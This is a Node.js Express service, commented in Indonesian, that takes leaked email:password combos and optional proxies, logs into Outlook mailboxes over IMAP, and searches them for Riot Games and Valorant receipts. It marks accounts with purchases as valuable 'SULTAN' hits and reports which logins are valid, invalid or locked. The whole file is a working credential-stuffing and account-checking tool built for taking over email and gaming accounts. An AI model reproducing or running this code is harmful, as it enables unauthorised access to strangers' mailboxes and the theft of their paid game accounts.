const express = require('express');
const { ImapFlow } = require('imapflow');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static('public'));

async function checkMail(email, password, proxy) {
    const client = new ImapFlow({
        host: "outlook.office365.com",
        port: 993,
        secure: true,
        auth: { user: email, pass: password },
        logger: false,
        ...(proxy && { proxy: proxy })
    });

    try {
        await client.connect();
        
        // 1. Cek INBOX
        let lock = await client.getMailboxLock('INBOX');
        let resultData = { skins: 0, sultan: false, count: 0 };
        
        try {
            // PENCARIAN KATA KUNCI MAKSIMAL
            let searchCriteria = {
                or: [
                    { header: { field: 'from', value: 'Riot Games' } },
                    { body: 'Valorant' },
                    { body: 'Purchase Receipt' },
                    { body: 'Order Confirmed' },
                    { body: 'Riot Games Payment' },
                    { body: 'Your Riot ID has been changed' },
                    { body: 'Welcome to Valorant' }
                ]
            };

            let messages = await client.search(searchCriteria);
            resultData.count = messages.length;

            // 2. DETEKSI AKUN SULTAN (Jika ada bukti pembelian)
            let sultanMessages = await client.search({
                or: [
                    { body: 'Purchase Receipt' },
                    { body: 'Order Confirmed' },
                    { body: 'Transaction Status: Success' }
                ]
            });

            if (sultanMessages.length > 0) {
                resultData.sultan = true;
            }

        } finally {
            lock.release();
        }

        await client.logout();
        
        return { 
            status: 'HIT', 
            count: resultData.count,
            isSultan: resultData.sultan,
            preview: resultData.sultan ? "⭐ SULTAN (Purchase Found)" : "Riot Data Found"
        };

    } catch (err) {
        if (err.message.includes('AUP') || err.message.includes('locked')) {
            return { status: 'LOCKED', message: 'Account Locked' };
        }
        return { status: 'INVALID', message: 'Login Failed' };
    }
}

app.post('/api/check', async (req, res) => {
    const { combo, proxy } = req.body;
    const [email, pass] = combo.split(':');
    
    if (!email || !pass) return res.json({ status: 'ERROR', message: 'Format Salah' });

    const result = await checkMail(email, pass, proxy);
    res.json({ ...result, combo });
});

const PORT = process.env.PORT || 7860;
app.listen(PORT, () => console.log(`Professional Mail Searcher v1.2 Active`));
